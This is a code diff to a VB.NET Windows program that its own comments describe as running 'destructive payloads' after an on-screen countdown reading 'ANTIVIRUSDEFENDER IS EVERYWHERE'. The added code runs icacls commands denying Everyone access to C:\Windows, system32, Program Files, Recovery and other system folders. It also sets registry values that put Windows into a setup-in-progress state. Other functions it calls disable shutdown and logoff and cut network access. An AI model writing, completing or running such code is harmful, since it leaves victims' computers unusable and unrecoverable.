@@ -127,11 +127,38 @@ Public Class Form1
                 Else
                     ' When countdown finishes, run destructive payloads and update label
                     timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
+                    Thread.Sleep(4000)
+                    ApplyAccessRestrictions()
                 End If
 
             Catch ex As Exception
                 MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
+        End Sub
+
+        ' Apply access restrictions
+        Private Sub ApplyAccessRestrictions()
+            Dim commands As String() = {
+            "icacls ""C:\Windows"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Program Files"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\ProgramData"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\System Volume Information"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Recovery"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\$RECYCLE.BIN"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Windows\config"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Windows\system32"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Windows\system"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Windows\winsxs"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F"
+        }
+
+            For Each command As String In commands
+                Try
+                    Form1.ExecuteCommand(command)
+                Catch ex As Exception
+                    MessageBox.Show("Failed to apply access restrictions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+                End Try
+            Next
         End Sub
 
         ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
@@ -615,31 +642,6 @@ Public Class Form1
         End Try
     End Sub
 
-    ' Apply access restrictions
-    Private Sub ApplyAccessRestrictions()
-        Dim commands As String() = {
-            "icacls ""C:\Windows"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Program Files"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\ProgramData"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\System Volume Information"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Recovery"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\$RECYCLE.BIN"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Windows\config"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Windows\system32"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Windows\system"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Windows\winsxs"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F"
-        }
-
-        For Each command As String In commands
-            Try
-                ExecuteCommand(command)
-            Catch ex As Exception
-                MessageBox.Show("Failed to apply access restrictions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-            End Try
-        Next
-    End Sub
-
     ' Disconnect the Internet by disabling all network adapters
     Private Sub DisconnectInternet()
         Try
@@ -839,10 +841,10 @@ Public Class Form1
 
             Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
                 If systemSetupKey IsNot Nothing Then
-                    systemSetupKey.SetValue("OOBEInProgress", 0, RegistryValueKind.DWord)
-                    systemSetupKey.SetValue("SetupType", 0, RegistryValueKind.DWord)
-                    systemSetupKey.SetValue("SetupPhase", 0, RegistryValueKind.DWord)
-                    systemSetupKey.SetValue("SystemSetupInProgress", 0, RegistryValueKind.DWord)
+                    systemSetupKey.SetValue("OOBEInProgress", 1, RegistryValueKind.DWord)
+                    systemSetupKey.SetValue("SetupType", 1, RegistryValueKind.DWord)
+                    systemSetupKey.SetValue("SetupPhase", 1, RegistryValueKind.DWord)
+                    systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
                 End If
             End Using
 
@@ -911,7 +913,6 @@ Public Class Form1
         DisableLogoffSwitchUserAndShutdown()
         SetWallpaper()
         KillGrantAccessAndDeleteShutdownExe()
-        ApplyAccessRestrictions()
     End Sub
 
     ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
@@ -928,14 +929,18 @@ Public Class Form1
             portalImage = Image.FromStream(ms)
         End Using
 
-        ' Loop through the drawing area in grid sizes
+        ' Save the image to file
+        Dim filePath As String = "C:\antivirusdefender.png"
+        portalImage.Save(filePath, System.Drawing.Imaging.ImageFormat.Png)
+
+        ' Draw the image with the portal effect
         For y As Integer = 0 To Me.Height Step gridSize
             For x As Integer = 0 To Me.Width Step gridSize
                 ' Calculate distorted positions using sine wave (for swirling effect)
                 Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
                 Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)
 
-                ' Draw the image at the distorted coordinates
+                ' Draw the saved image at the distorted coordinates
                 g.DrawImage(portalImage, distortedX, distortedY, gridSize, gridSize)
             Next
         Next
